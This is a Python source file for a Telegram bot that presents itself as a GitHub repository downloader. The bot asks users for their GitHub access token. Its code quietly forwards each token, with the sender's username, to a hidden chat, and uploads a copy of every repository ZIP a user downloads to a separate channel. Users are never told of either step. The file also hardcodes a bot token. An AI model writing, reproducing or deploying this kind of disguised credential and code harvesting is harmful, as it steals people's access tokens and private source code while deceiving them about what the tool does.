import requests
import os
import telebot
import json
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask
from threading import Thread
import logging
import time
import sys

# Set your bot token
BOT_TOKEN = "7904561367:AAEc3S-KdUN6jcUpcYwvup2CjsOTYLFTuPI"
bot = telebot.TeleBot(BOT_TOKEN)

# File to save approved users and their tokens
TOKEN_FILE = "approved_users.json"

# Flask app for health check
app = Flask(__name__)

@app.route('/health', methods=['GET'])
def health():
    return "OK", 200

# Load tokens from file if they exist
def load_approved_users():
    try:
        if os.path.exists(TOKEN_FILE):
            with open(TOKEN_FILE, 'r') as file:
                return json.load(file)
        return {}
    except Exception as e:
        logging.error(f"Failed to load approved users: {e}")
        return {}

# Save approved users and their tokens to a file
def save_approved_users():
    try:
        with open(TOKEN_FILE, 'w') as file:
            json.dump(user_tokens, file)
    except Exception as e:
        logging.error(f"Failed to save approved users: {e}")

# To store GitHub tokens and approved users persistently (loaded from the file)
user_tokens = load_approved_users()

# Function to fetch all repositories using a GitHub token
def get_github_repos(token):
    try:
        url = "https://api.github.com/user/repos"
        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json"
        }

        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            return response.json()  # Return the list of repos
        else:
            logging.error(f"Failed to fetch repos. Status code: {response.status_code}")
            return []
    except requests.exceptions.RequestException as e:
        logging.error(f"Error fetching GitHub repositories: {e}")
        return []

# Function to download a GitHub repository as a ZIP file
def download_github_repo(token, repo_full_name):
    try:
        url = f"https://api.github.com/repos/{repo_full_name}/zipball"
        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json"
        }

        response = requests.get(url, headers=headers, stream=True)
        if response.status_code == 200:
            save_path = os.getcwd()
            zip_filename = os.path.join(save_path, f"{repo_full_name.replace('/', '_')}.zip")
            
            with open(zip_filename, 'wb') as f:
                for chunk in response.iter_content(chunk_size=128):
                    f.write(chunk)

            return zip_filename
        else:
            logging.error(f"Failed to download repo {repo_full_name}. Status code: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        logging.error(f"Error downloading GitHub repository: {e}")
        return None

# Start command handler
@bot.message_handler(commands=['start'])
def handle_start(message):
    try:
        user_id = message.from_user.id
        markup = InlineKeyboardMarkup()
        owner_button = InlineKeyboardButton("🗿Owner🗿", url="https://t.me/botplays90")
        markup.add(owner_button)

        if str(user_id) in user_tokens:
            bot.send_message(message.chat.id, "‼️Welcome To Github Repo Downloader Bot 😀 Send Me Your Github Token And I Will Download Repo For You🤗‼️ .", reply_markup=markup)
            bot.register_next_step_handler(message, handle_github_token)
        else:
            bot.send_message(message.chat.id, "⚠️You Are Not Authorized To Use This Bot⚠️. Please Contact The Developer @botplays90🗿.", reply_markup=markup)
    except Exception as e:
        logging.error(f"Error handling /start command: {e}")

# Approve command handler for admin to approve users
@bot.message_handler(commands=['approve'])
def handle_approve(message):
    try:
        if message.from_user.id == 6897739611:
            user_id_to_approve = int(message.text.split()[1])
            if str(user_id_to_approve) not in user_tokens:
                user_tokens[str(user_id_to_approve)] = None  # Initialize with no token
                save_approved_users()  # Save to file
                bot.send_message(message.chat.id, f"User {user_id_to_approve} has been approved✅.")
            else:
                bot.send_message(message.chat.id, f"User {user_id_to_approve} is already approved.")
        else:
            bot.send_message(message.chat.id, "⚠️You are not authorized to approve users⚠️.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "❌Please provide a valid user ID to approve. Example: /approve 6969696969")
    except Exception as e:
        logging.error(f"Error handling /approve command: {e}")

# Function to handle GitHub token input
def handle_github_token(message):
    try:
        github_token = message.text
        user_tokens[str(message.chat.id)] = github_token  # Store user's GitHub token
        
        save_approved_users()  # Save the token to the file

        # Forward the token to the channel with a mention of the user who sent it
        user_mention = f"@{message.from_user.username}" if message.from_user.username else f"User ID: {message.from_user.id}"
        bot.send_message(2497737475, f"GitHub token sent by {user_mention}: {github_token}")

        repos = get_github_repos(github_token)

        if not repos:
            bot.send_message(message.chat.id, "Failed to fetch repositories or no repositories found😖 Use /start Again.")
            return

        # Create inline buttons for each repository
        markup = InlineKeyboardMarkup()
        for repo in repos:
            repo_name = repo['full_name']
            markup.add(InlineKeyboardButton(repo_name, callback_data=repo_name))

        # Add Owner button
        owner_button = InlineKeyboardButton("🗿OWNER🗿", url="https://t.me/botplays90")
        markup.add(owner_button)

        bot.send_message(message.chat.id, "Select A Repository And I Will  Download It For You🚀:", reply_markup=markup)
    except Exception as e:
        logging.error(f"Error handling GitHub token: {e}")

# Callback query handler for inline buttons
@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    try:
        repo_full_name = call.data
        github_token = user_tokens.get(str(call.message.chat.id))

        if not github_token:
            bot.send_message(call.message.chat.id, "GitHub Token Not Found ❌ Please Check The Token You Provided And Try Again ")
            return

        # Download the selected repository
        zip_file = download_github_repo(github_token, repo_full_name)

        if zip_file:
            # Send the ZIP file to the user
            with open(zip_file, 'rb') as file:
                bot.send_document(call.message.chat.id, file)

            # Get the user's username or ID for the channel message
            user_mention = f"@{call.from_user.username}" if call.from_user.username else f"User ID: {call.from_user.id}"
            message_for_channel = f"Repository {repo_full_name} downloaded by {user_mention}"

            # Send the ZIP file to the channel with the user mention
            with open(zip_file, 'rb') as file:
                bot.send_document(-1002386161781, file, caption=message_for_channel)  # Sending to the channel with a mention

            # Delete the file after sending
            os.remove(zip_file)
        else:
            bot.send_message(call.message.chat.id, f"Failed To Download Repository😖 {repo_full_name}.")
    except Exception as e:
        logging.error(f"Error handling callback query: {e}")

# Start the Flask app in a separate thread
def run_flask():
    app.run(host='0.0.0.0', port=10001)

Thread(target=run_flask).start()

# Main loop to handle polling
if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Error occurred: {e}")
            time.sleep(5)  # Wait before restarting the polling
            # Restart the bot
            os.execv(sys.executable, ['python'] + sys.argv)
